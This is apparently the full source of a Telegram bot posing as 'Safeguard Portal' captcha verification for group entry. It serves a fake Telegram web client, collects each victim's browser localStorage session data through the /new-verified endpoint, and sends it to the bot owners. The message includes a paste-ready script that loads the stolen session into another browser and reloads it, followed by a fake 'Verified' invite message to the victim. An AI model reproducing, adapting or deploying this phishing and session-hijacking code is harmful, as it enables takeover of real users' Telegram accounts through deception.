/**
 * Safeguard Telegram Bot
 * Deno Deploy v2 compatible — uses Deno.serve() + native Response
 * grammY v1.30 for bot logic, Deno KV for persistence
 */

import {
  Bot,
  InlineKeyboard,
  InputFile,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";

// ── Types ──────────────────────────────────────────────

interface SafeguardConfig {
  channel: string;
  image: string;
  name: string;
  inviteLink: string;
}

interface VerifiedBody {
  user?: { username: string; id: string };
  storage?: Record<string, string>;
}

const MIME_TYPES: Record<string, string> = {
  ".html": "text/html",
  ".css": "text/css",
  ".js": "application/javascript",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".wasm": "application/wasm",
  ".txt": "text/plain",
  ".mp3": "audio/mpeg",
  ".mp4": "video/mp4",
  ".webmanifest": "application/manifest+json",
};

// ── Environment ────────────────────────────────────────

const requiredEnv = ["BOT_OWNER", "GATE_KEEPER"] as const;
for (const key of requiredEnv) {
  if (!Deno.env.get(key)) {
    console.error(`WARNING: Missing env: ${key} — bot may not work`);
  }
}

const botOwner = Deno.env.get("BOT_OWNER")!;
const botName = Deno.env.get("BOT_NAME") ?? "safeguuarrdbot";
const webAppLink = Deno.env.get("WEB_APP_LINK") ?? "";
const gateKeeper = Deno.env.get("GATE_KEEPER")!;
const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY") ?? "";
const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY") ?? "";
const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED") ?? "";
const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));

const sgConfigDefault: SafeguardConfig = {
  channel: "",
  image: "",
  name: "",
  inviteLink: "",
};

// ── Bot initialization ─────────────────────────────────

const bot = new Bot(gateKeeper);

// ── Bot commands ───────────────────────────────────────

bot.chatType("private").command("start", async (ctx) => {
  const parts = ctx.message?.text?.split(" ") ?? [];
  const id = parts[parts.length - 1] ?? "";

  const caption =
    `<b>Verify you're human with Safeguard Portal</b>\n\n` +
    `Click 'VERIFY' and complete captcha to gain entry - ` +
    `<a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;

  let photo: InputFile;
  if (sgClickVerifyURL) {
    photo = new InputFile({ url: sgClickVerifyURL });
  } else {
    photo = new InputFile("./safeguard-click-verify.jpg");
  }

  const keyboard = new InlineKeyboard().webApp(
    "VERIFY",
    webAppLink ? `${webAppLink}?c=${id}` : "",
  );

  await ctx.replyWithPhoto(photo, {
    caption,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.on("my_chat_member", async (ctx) => {
  if (ctx.myChatMember.chat.type !== "channel") return;

  const caption =
    `<b>Verify you're human with Safeguard Portal</b>\n\n` +
    `Click 'VERIFY' and complete captcha to gain entry - ` +
    `<a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;

  let photo: InputFile;
  if (sgClickVerifyURL) {
    photo = new InputFile({ url: sgClickVerifyURL });
  } else {
    photo = new InputFile("./safeguard-click-verify.jpg");
  }

  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink);

  await ctx.replyWithPhoto(photo, {
    caption,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.chatType("private").command("setup", async (ctx) => {
  await ctx.reply(
    `Fill below and send\n\n` +
      `channel: //@username\n` +
      `image: // image url to display in your channel\n` +
      `name:  // community name\n` +
      `inviteLink: // your group invite link`,
  );
});

bot.chatType("private").on("message:text", async (ctx) => {
  let reply = "Saved!\n\nPlease note that it will be deleted after summer.";

  const lines = ctx.message?.text?.split("\n") ?? [];
  if (lines.length < 4) {
    await ctx.reply("Invalid format. Need 4 lines: channel, image, name, inviteLink");
    return;
  }

  const kv = (text: string): string => {
    const value = text.trim().split(":");
    if (value.length < 2) throw new Error("Invalid format");
    return value.slice(1).join(":").trim();
  };

  try {
    const config: SafeguardConfig = { ...sgConfigDefault };
    config.channel = kv(lines[0]);
    config.image = kv(lines[1]);
    config.name = kv(lines[2]);
    config.inviteLink = kv(lines[3]);

    const db = await Deno.openKv();
    await db.set(["channel", config.channel], config);
  } catch (e) {
    console.error("Setup error:", e);
    reply = "Hmmm, looks like your format is wrong";
  }

  await ctx.reply(reply);
});

bot.catch((err) => {
  console.error("Bot error:", err.message);
});

// ── Request handlers ───────────────────────────────────

async function handleNewVerified(req: Request): Promise<Response> {
  try {
    const body: VerifiedBody = await req.json();
    const { storage, user } = body;

    if (!storage) {
      return Response.json({ msg: "ok" });
    }

    const userInfo = user ?? { username: "durov", id: "" };
    if (!userInfo.id && storage.user_auth) {
      try {
        userInfo.id = JSON.parse(storage.user_auth).id ?? "";
      } catch { /* ignore parse errors */ }
    }

    // Notify bot owners
    const log =
      `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji>` +
      `<a href="t.me/${userInfo.username}">@${userInfo.username}</a>\n\n` +
      `<pre>Object.entries(${
        JSON.stringify(storage)
      }).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;

    for (const owner of botOwner.split(",").filter(Boolean)) {
      await bot.api.sendMessage(owner, log, { parse_mode: "HTML" });
    }

    // Get channel config from KV
    const db = await Deno.openKv();
    const entry = await db.get<SafeguardConfig>(["channel", "default"]);
    const config = entry.value ?? sgConfigDefault;

    // Send invite to user
    let imageLink: string | InputFile;
    if (sgVerifiedURL) {
      imageLink = new InputFile({ url: sgVerifiedURL });
    } else {
      imageLink = new InputFile("./safeguard-verify.jpg");
    }

    const verifyMsg =
      `Verified, you can join the group using this temporary link:\n\n` +
      `<a href="${config.inviteLink}">${config.inviteLink}</a>\n\n` +
      `This link is a one time use and will expire`;

    const inviteMsg =
      `<b>Verified!</b>\n\n` +
      `Join request has been sent and you will be added once the admin approves your request`;

    try {
      const userAuth = JSON.parse(storage.user_auth ?? "{}");
      await bot.api.sendPhoto(userAuth.id, imageLink, {
        caption: config.inviteLink ? verifyMsg : inviteMsg,
        parse_mode: "HTML",
      });
    } catch (e) {
      console.error("Failed to send verification photo:", e);
    }

    return Response.json({ msg: "ok" });
  } catch (ex) {
    console.error("new-verified error:", ex);
    return Response.json({ msg: "ok" });
  }
}

// ── Static file serving ────────────────────────────────

function serveFile(root: string, filename: string): Promise<Response> {
  const filePath = root.endsWith("/") ? root + filename : root + "/" + filename;
  const ext = filename.includes(".")
    ? filename.slice(filename.lastIndexOf("."))
    : "";
  const mime = MIME_TYPES[ext] ?? "application/octet-stream";

  return Deno.readFile(filePath)
    .then((data) => new Response(data, { headers: { "content-type": mime } }))
    .catch(() => {
      // SPA fallback: serve index.html
      const indexPath = root.endsWith("/")
        ? root + "index.html"
        : root + "/index.html";
      return Deno.readTextFile(indexPath)
        .then((html) =>
          new Response(html, { headers: { "content-type": "text/html" } })
        )
        .catch(() => new Response("Not Found", { status: 404 }));
    });
}

// ── Main request handler ───────────────────────────────

let botReady = false;

async function handleRequest(req: Request): Promise<Response> {
  // Lazy init — don't block export
  if (!botReady) {
    await bot.init();
    botReady = true;
    console.log("Bot ready for requests");
  }
  
  const url = new URL(req.url);
  const path = url.pathname.slice(1);
  console.log(`→ ${req.method} /${path || "(root)"}`);

  try {
    // Webhook (POST only) — handle update directly
    if (req.method === "POST" && path === "tg-webhook") {
      try {
        const update = await req.json();
        await bot.handleUpdate(update);
      } catch (e) {
        console.error("Webhook error:", (e as Error).message);
      }
      return new Response("ok");
    }

    // API endpoint (POST only)
    if (req.method === "POST" && path === "new-verified") {
      return await handleNewVerified(req);
    }

    // Health check
    if (path === "ping") {
      return new Response("pong", {
        headers: { "content-type": "text/plain" },
      });
    }

    // Root / test
    if (path === "" || path === "test") {
      try {
        const html = await Deno.readTextFile("./static/tweb/index.html");
        return new Response(html, {
          headers: { "content-type": "text/html" },
        });
      } catch {
        return new Response("Not Found", { status: 404 });
      }
    }

    // Safeguard portal
    if (path === "sg" || path === "sg/") {
      try {
        const html = await Deno.readTextFile("./static/sg/index.html");
        return new Response(html, {
          headers: { "content-type": "text/html" },
        });
      } catch {
        return new Response("Not Found", { status: 404 });
      }
    }

    // Static files with path prefix
    let filename = path || "index.html";
    const parts = filename.split("/");
    if (parts.length > 1) filename = parts[parts.length - 1]!;

    if (path.startsWith("sg/") || path.startsWith("sg?")) {
      return await serveFile("./static/sg", filename);
    }

    if (path.startsWith("tweb")) {
      return await serveFile("./static/tweb", filename);
    }

    // Files with extensions from tweb root
    if (path.includes(".")) {
      return await serveFile("./static/tweb", filename);
    }

    // Default JSON response
    return Response.json({ msg: "ok" });
  } catch (err) {
    console.error("Request error:", (err as Error).message ?? err);
    return new Response("Internal Server Error", { status: 500 });
  }
}

// ── Startup ────────────────────────────────────────────

console.log(`Safeguard bot starting...`);
console.log(`Bot: @${botName} | Owners: ${botOwner}`);

if (DEBUG) {
  console.log("DEBUG mode — starting bot in polling mode");
  bot.start({
    onStart: () => console.log("Bot polling started"),
  });
} else {
  console.log("Production mode — using webhook");
}

// Deno Deploy v2 uses the export above.
// For local dev: deno serve main.ts  OR  uncomment below:
// if (Deno.env.get("DEBUG")) Deno.serve(handleRequest);

export default { fetch: handleRequest };
